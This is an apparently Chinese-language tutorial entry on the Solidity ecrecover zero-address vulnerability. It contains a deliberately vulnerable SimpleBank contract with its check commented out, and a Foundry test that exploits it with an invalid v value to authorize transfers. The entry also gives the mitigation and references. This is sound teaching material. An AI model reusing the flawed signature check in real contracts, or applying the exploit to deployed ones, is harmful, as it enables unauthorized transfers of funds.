# ecRecover 返回(0)地址

**名称：** ecrecover 返回(0)地址

**说明：** 在 SimpleBank 合约中，转账函数将消息哈希和签名（v、r、s 值）作为输入。 它恢复签名者地址并检查它是否等于 Admin。 该漏洞在于，当签名参数无效时，ecrecover函数可能会返回0x0地址，如果v值不是27或28，则会返回(0)地址。

**解决措施：**

验证 ecrecover 的结果不为 0，或者使用 OpenZeppelin 的 ECDSA 库。

**参考：**

https://twitter.com/1nf0s3cpt/status/1674268926761668608

https://github.com/code-423n4/2021-09-swivel-findings/issues/61

https://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md

**SimpleBank 合约样例:**

```jsx
contract SimpleBank {
    mapping(address => uint256) private balances;
    address Admin; //default is address(0)

    function getBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }

    function recoverSignerAddress(
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) private pure returns (address) {
        address recoveredAddress = ecrecover(_hash, _v, _r, _s);
        return recoveredAddress;
    }

    function transfer(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(_to != address(0), "Invalid recipient address");

        address signer = recoverSignerAddress(_hash, _v, _r, _s);
        console.log("signer", signer);
        //Mitigation
        //require(signer != address(0), "Invalid signature");
        require(signer == Admin, "Invalid signature");

        balances[_to] += _amount;
    }
}
```

***\*测试方法:\****

仿真测试--contracts src/test/***\*ecrecover.sol\**** -vvvv

```jsx
// Function to test a ecRecover vulnerability
    function testecRecover() public {
        // Emits a log with the balance of the current contract before exploitation
        emit log_named_decimal_uint(
            "Before exploiting, my balance",
            SimpleBankContract.getBalance(address(this)),
            18
        );

        // Generates a message hash
        bytes32 _hash = keccak256(
            abi.encodePacked("\\x19Ethereum Signed Message:\\n32")
        );

        // Signs the generated hash using vm.sign function. Here, 1 represents the account index
        // The returned variables r and s are part of the ECDSA signature (Elliptic Curve Digital Signature Algorithm)
        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);

        // Sets the v variable to 29
        // Typically in Ethereum, v is 27 or 28. When v is neither 27 nor 28, 
        // the ecrecover function used for signature validation will return address(0)
        uint8 v = 29;

        // Calls the transfer function of the SimpleBankContract with an incorrect v value
        // If SimpleBankContract does not correctly validate the v value of the signature,
        // this could lead to an unauthorized transfer
        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);

        // Emits a log with the balance of the current contract after the exploit
        emit log_named_decimal_uint(
            "After exploiting, my balance",
            SimpleBankContract.getBalance(address(this)),
            18
        );
    }
```

**红色框：返回零地址。**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe8189c2a-67a9-4ddc-8a03-be3b2bdcce6a%2FUntitled.png?table=block&id=5f54d930-33e2-4f0a-87d5-98ce4bcb4a11&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)